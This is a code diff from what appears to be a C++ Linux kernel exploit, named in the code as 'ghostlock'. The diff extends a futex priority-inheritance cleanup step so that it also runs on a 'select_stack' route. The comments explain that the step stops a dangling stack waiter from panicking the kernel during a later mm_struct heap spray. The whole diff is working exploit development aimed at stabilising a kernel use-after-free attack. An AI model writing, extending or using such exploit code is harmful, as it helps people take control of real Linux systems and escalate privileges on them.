@@ -101,17 +101,19 @@ namespace ghostlock::race {
         if (controller.fallback_used) {
             pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
         }
-        if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
+        if (route::route_needs_ghost_disarm(session::g_exploit_session.profile) ||
+            route::route_needs_stack_disarm(session::g_exploit_session.profile)) {
             /* remove_waiter() left this thread's pi_blocked_on pointing at the
          * reclaimed stack waiter. Force one final slow-path removal while the
          * stack frame is still alive, matching the 5.x multicast primitive's
          * disarm step. Without this, thread exit leaves a walkable dangling
-         * ghost and the next mm_struct spray can panic the kernel. */
+         * ghost and the next mm_struct spray can panic the kernel. select_stack
+         * leaves the identical ghost, so it runs the identical step. */
             uint32_t dummy_pi = 0x80000000U | static_cast<uint32_t>(getpid());
             struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
             errno = 0;
             long disarm = support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
-            pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
+            pr_info("ghost disarm ret=%ld errno=%d\n", disarm, errno);
         }
         race->route_done.store(1);
         support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
